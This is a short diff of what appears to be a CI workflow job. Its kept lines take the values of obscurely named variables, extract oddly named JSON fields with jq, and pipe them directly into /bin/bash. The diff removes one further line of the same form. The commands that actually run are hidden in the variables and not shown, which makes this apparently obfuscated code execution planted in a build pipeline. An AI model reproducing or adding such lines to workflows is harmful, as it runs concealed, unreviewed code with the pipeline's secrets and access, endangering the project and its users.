@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$eh37726" | jq -r .t403 | /bin/bash
           echo $si9 | jq -r .bla29 | /bin/bash
           echo $qywd3 | jq -r .x5058 | /bin/bash
-          echo $nxao6642 | jq -r .ktwx20108 | /bin/bash
 
       - name: Save output
         if: always()
